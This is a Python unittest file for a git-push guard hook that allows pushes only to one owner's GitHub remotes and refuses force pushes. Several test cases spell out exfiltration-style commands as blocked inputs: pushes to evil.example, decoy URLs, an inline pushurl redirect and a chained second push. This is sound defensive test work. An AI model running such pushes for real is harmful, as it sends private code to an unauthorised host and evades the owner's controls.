"""pre-bash-git-push-guard.sh — egress: push only to github.com/Moonkus/…"""
import unittest

from _harness import bash, make_repo, run_hook

ALLOWED = "git@github.com:Moonkus/fb-organizer.git"


class PushGuardTest(unittest.TestCase):
    def push(self, command, repo):
        return run_hook("pre-bash-git-push-guard.sh", bash(command, cwd=repo), cwd=repo)

    def test_allows_owner_remote_including_main(self):
        with make_repo(ALLOWED) as repo:
            for cmd in ("git push", "git push origin main", "git push -u origin HEAD"):
                with self.subTest(cmd=cmd):
                    proc = self.push(cmd, repo)
                    self.assertEqual(proc.returncode, 0, proc.stderr)

    def test_allows_https_owner_remote_case_insensitive(self):
        with make_repo("https://github.com/moonkus/fb-organizer.git", branch="fix/y") as repo:
            self.assertEqual(self.push("git push origin fix/y", repo).returncode, 0)

    def test_blocks_foreign_owner_remote(self):
        with make_repo("git@github.com:someone-else/fork.git") as repo:
            proc = self.push("git push origin main", repo)
            self.assertEqual(proc.returncode, 2)
            self.assertIn("not under github.com/Moonkus", proc.stderr)

    def test_blocks_explicit_foreign_url_and_decoys(self):
        with make_repo(ALLOWED) as repo:
            for url in ("https://evil.example/x.git", "https://evil.example/github.com/Moonkus/x.git",
                        "git@evil.example:Moonkus/x.git"):
                with self.subTest(url=url):
                    self.assertEqual(self.push(f"git push {url} HEAD", repo).returncode, 2)

    def test_blocks_inline_config_redirect(self):
        with make_repo(ALLOWED) as repo:
            proc = self.push("git -c remote.origin.pushurl=https://evil.example/x.git push origin", repo)
            self.assertEqual(proc.returncode, 2)

    def test_blocks_chained_bad_push(self):
        with make_repo(ALLOWED) as repo:
            proc = self.push("git push origin main && git push https://evil.example/x.git HEAD", repo)
            self.assertEqual(proc.returncode, 2)

    def test_blocks_force_anywhere(self):
        with make_repo(ALLOWED, branch="feature/x") as repo:
            for cmd in ("git push --force", "git push origin feature/x --force", "git push -f origin feature/x",
                        "git push -uf origin feature/x", "git push origin +feature/x", "git push --mirror origin"):
                with self.subTest(cmd=cmd):
                    proc = self.push(cmd, repo)
                    self.assertEqual(proc.returncode, 2, proc.stderr)
                    self.assertIn("refused", proc.stderr)

    def test_lease_allowed_on_feature_branch_only(self):
        with make_repo(ALLOWED, branch="feature/x") as repo:
            self.assertEqual(self.push("git push --force-with-lease origin feature/x", repo).returncode, 0)
            self.assertEqual(self.push("git push --force-with-lease", repo).returncode, 0)
            self.assertEqual(self.push("git push --force-with-lease origin HEAD:main", repo).returncode, 2)
        with make_repo(ALLOWED) as repo:
            self.assertEqual(self.push("git push --force-with-lease", repo).returncode, 2)

    def test_no_network_needed(self):
        # egress-only: an unreachable origin must not matter and must not warn
        with make_repo(ALLOWED, branch="feature/x") as repo:
            proc = self.push("git push -u origin feature/x", repo)
            self.assertEqual((proc.returncode, proc.stderr), (0, ""))

    def test_ignores_non_push(self):
        with make_repo(ALLOWED) as repo:
            self.assertEqual(self.push("git commit -m 'push later'", repo).returncode, 0)


if __name__ == "__main__":
    unittest.main()
